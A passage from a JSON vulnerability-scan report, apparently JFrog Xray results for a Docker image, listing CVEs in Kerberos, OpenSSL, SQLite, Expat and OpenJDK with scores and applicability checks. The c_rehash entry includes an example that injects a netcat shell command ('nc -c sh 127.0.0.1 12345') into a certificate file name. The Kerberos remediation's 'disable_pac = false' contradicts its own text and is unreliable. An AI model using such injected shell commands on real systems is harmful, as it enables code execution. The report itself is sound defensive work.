                    "summary": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
                    "description": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-42898",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-12-26T00:00:00.177Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "An integer overflow in PAC parser of Kerberos 5 can lead to remote code execution (on 32-bit systems) or denial of service (on all systems) when parsing a crafted Kerberos ticket.",
                        "full_description": "[MIT Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol that uses secret key cryptography to secure communications over a computer network. \n\n[Privilege Attribute Certificate](https://wiki.samba.org/index.php/Kerberos_PAC) (PAC) is a data structure that is used in the Kerberos network authentication protocol to store authorization data for a user. It is used to determine what resources a user is allowed to access and what actions they are allowed to perform. \n\nA PAC is typically embedded in a ticket that is issued by the Kerberos authentication server and passed to the client system when the user logs in. The client system uses the PAC to determine the user's permissions when the user attempts to access a resource.\n\nThe client system will send the ticket and the PAC to the resource server, which will use the information contained in the PAC to determine whether the user is allowed to access the resource. If the user is authorized, the resource server will grant access to the resource. If the user is not authorized, the resource server will deny access to the resource.\n\nThe Kerberos' PAC parser lacks a size check that prevents an integer overflow. A crafted PAC can either: \n- Cause a smaller-than-needed buffer allocation that will contain the PAC parsed data and can subsequently lead to a heap-buffer overflow which might lead to remote code execution (on 32-bit systems only),\n- Cause a bigger-than-needed buffer allocation which will lead to a read out-of-bounds and possible DoS.\n\nSince the PAC is parsed only after extraction from a decrypted ticket, the attacker needs to produce a ticket that the victim can decrypt. For that reason, among the services using Kerberos protocol, the Key Distribution Center (KDC) is an easy target as any authenticated attacker can print a ticket encrypted with their own long-term key and get the KDC to parse the PAC contained within. \n\n[A patch](https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4) was released for the MIT Kerberos. \nSamba implements their own version of Kerberos library and released a [patch](https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch).\nHeimdal also released a [patch](https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b).\n\nThis issue also impacts [Microsoft's Kerberos in Active Directory](https://www.samba.org/samba/security/CVE-2022-42898.html).",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attackers must send a Kerberos ticket that the victim can decrypt to get the PAC to be parsed.",
                                "is_positive": true
                            },
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "While MIT Kerberos's patch includes 2 PACs causing a DoS, there is no technical discussion or PoC that demonstrates exploiting the heap overflow (on 32-bit systems) for code execution",
                                "is_positive": true
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Can lead to remote code execution on 32-bit systems",
                                "is_positive": false
                            },
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "is_positive": false
                            }
                        ],
                        "remediation": "##### Deployment mitigations\n\nPAC can be disabled in KDC configuration file (kdc.conf) for version 1.20+:\n```\n[kdcdefault]\n  disable_pac = false\n```"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "cve_id": "CVE-2022-42898",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable Kerberos KDC service binary - <code>krb5kdc</code> (32-bit variant) exists in the artifact</p>",
                            "evidence": null,
                            "info": "Did not find a 32-bit Kerberos KDC executable (krb5kdc)",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "vulnerability_id": "CVE-2022-42898",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-522768",
                    "summary": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
                    "description": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2016-7798",
                            "cwe": [
                                "CWE-326"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2023-07-03T00:00:00.484Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2016-7798",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if the function <code>OpenSSL::Cipher.new()</code> is called with AES gcm is as the encryption type. <br />\nFor determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The AES IV initialization happens before the key initialization.</p>",
                            "evidence": null,
                            "info": "Vulnerable AES gcm encryption is not set",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2016-7798",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if the function <code>OpenSSL::Cipher.new()</code> is called with AES gcm is as the encryption type. <br />\nFor determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The AES IV initialization happens before the key initialization.</p>",
                            "evidence": null,
                            "info": "Vulnerable AES gcm encryption is not set",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2016-7798",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2016-7798",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-173702",
                    "summary": "A flaw was found in SQLite's SELECT query functionality (src/select.c). This flaw allows an attacker who is capable of running SQL queries locally on the SQLite database to cause a denial of service or possible code execution by triggering a use-after-free. The highest threat from this vulnerability is to system availability.",
                    "description": "A flaw was found in SQLite's SELECT query functionality (src/select.c). This flaw allows an attacker who is capable of running SQL queries locally on the SQLite database to cause a denial of service or possible code execution by triggering a use-after-free. The highest threat from this vulnerability is to system availability.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-20227",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-04-25T00:00:00.212Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-20227",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-196527",
                    "summary": "Expat (aka libexpat) before 2.4.4 has an integer overflow in the doProlog function.",
                    "description": "Expat (aka libexpat) before 2.4.4 has an integer overflow in the doProlog function.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-23990",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-01-27T00:00:00.705Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-23990",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-23990",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-208683",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21434",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-04-20T00:00:00.489Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21434",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-693687",
                    "summary": "Vulnerability in Oracle Java SE (component: Compiler).  Supported versions that are affected are Oracle Java SE: 21.0.6, 24; Oracle GraalVM for JDK: 21.0.6 and  24. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE accessible data as well as  unauthorized read access to a subset of Oracle Java SE accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "description": "Vulnerability in Oracle Java SE (component: Compiler).  Supported versions that are affected are Oracle Java SE: 21.0.6, 24; Oracle GraalVM for JDK: 21.0.6 and  24. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE accessible data as well as  unauthorized read access to a subset of Oracle Java SE accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-30691"
                        }
                    ],
                    "created": "2025-04-19T00:00:00.123Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-30691",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180242",
                    "summary": "ec_verify in kdc/kdc_preauth_ec.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.18.4 and 1.19.x before 1.19.2 allows remote attackers to cause a NULL pointer dereference and daemon crash. This occurs because a return value is not properly managed in a certain situation.",
                    "description": "ec_verify in kdc/kdc_preauth_ec.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.18.4 and 1.19.x before 1.19.2 allows remote attackers to cause a NULL pointer dereference and daemon crash. This occurs because a return value is not properly managed in a certain situation.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-36222",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-07-25T00:00:00.778Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-36222",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-209584",
                    "summary": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
                    "description": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-1292",
                            "cwe": [
                                "CWE-78"
                            ],
                            "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-05-04T00:00:00.696Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "Improper filename validation in `c_rehash` can lead to arbitrary code execution.",
                        "full_description": "[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" > \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                                "description": "If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Exploiting this vulnerability leads to code execution.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-1292",
                            "scan_status": 1,
                            "applicability": true,
                            "scanner_explanation": "<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>",
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Offset",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/etc/ca-certificates/update.d/certhash",
                                            "0x00000018",
                                            "The vulnerable string 'c_rehash' was found in the image"
                                        ]
                                    ]
                                }
                            ],
                            "info": "The vulnerable string 'c_rehash' was found in the image",
                            "details": [
                                {
                                    "file_path": "/etc/ca-certificates/update.d/certhash",
                                    "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-1292",
                            "scan_status": 1,
                            "applicability": true,
                            "scanner_explanation": "<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>",
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Offset",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/etc/ca-certificates/update.d/certhash",
                                            "0x00000018",
                                            "The vulnerable string 'c_rehash' was found in the image"
                                        ]
                                    ]
                                }
                            ],
                            "info": "The vulnerable string 'c_rehash' was found in the image",
                            "details": [
                                {
                                    "file_path": "/etc/ca-certificates/update.d/certhash",
                                    "details": "Offset: 0x00000018, Issue Found: The vulnerable string 'c_rehash' was found in the image"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-1292",
                            "result": "applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-1292",
                            "result": "applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-231408",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
